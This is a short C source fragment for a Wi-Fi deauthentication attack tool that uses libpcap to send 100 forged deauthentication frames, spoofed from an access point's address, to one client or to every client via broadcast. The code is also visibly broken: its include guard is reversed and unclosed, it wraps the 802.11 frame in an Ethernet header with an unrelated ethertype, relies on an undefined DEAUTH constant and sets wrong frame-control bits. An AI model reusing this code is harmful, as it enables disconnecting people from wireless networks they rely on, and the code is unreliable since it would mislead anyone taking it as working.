#define DEAUTH_H
#ifndef DEAUTH_H

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <netinet/ether.h>
#include <unistd.h>  
#include "deauth.h"

#define MAX_DEAUTH_PACKETS 100

struct ieee80211_frame {
    u_int8_t i_fc[2];
    u_int8_t i_dur[2];
    u_int8_t i_addr1[ETH_ALEN];
    u_int8_t i_addr2[ETH_ALEN];
    u_int8_t i_addr3[ETH_ALEN];
    u_int8_t i_seq[2];
};

void send_control_packet(pcap_t *handle, u_char *bssid, u_char *client) {
    struct ether_header *eth_header;
    u_char packet[128];
    
    memset(packet, 0, sizeof(packet));
    eth_header = (struct ether_header *) packet;

    if (client == NULL) {
        memset(eth_header->ether_dhost, 0xFF, ETH_ALEN);
    } else {
        memcpy(eth_header->ether_dhost, client, ETH_ALEN);
    }

    memcpy(eth_header->ether_shost, bssid, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_AARP);

    struct ieee80211_frame *deauth_frame = (struct ieee80211_frame *)(packet + sizeof(struct ether_header));
    memset(deauth_frame, 0, sizeof(struct ieee80211_frame));
    memcpy(deauth_frame->i_addr1, eth_header->ether_dhost, ETH_ALEN);
    memcpy(deauth_frame->i_addr2, eth_header->ether_shost, ETH_ALEN);
    memcpy(deauth_frame->i_addr3, eth_header->ether_shost, ETH_ALEN);
    deauth_frame->i_fc[0] = 0x00;
    deauth_frame->i_fc[1] = (0xC0 | DEAUTH);
    deauth_frame->i_dur[0] = 0;
    deauth_frame->i_seq[0] = 0;

    u_int16_t reason_code = htons(0x0001);
    memcpy(packet + sizeof(struct ether_header) + sizeof(struct ieee80211_frame), &reason_code, sizeof(reason_code));

    for (int i = 0; i < MAX_DEAUTH_PACKETS; i++) {
        if (pcap_sendpacket(handle, packet, sizeof(packet)) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
        }
        usleep(100000);
    }

    printf("Sent deauthentication packet to %s from %s\n", ether_ntoa((struct ether_addr *)client), ether_ntoa((struct ether_addr *)bssid));
}
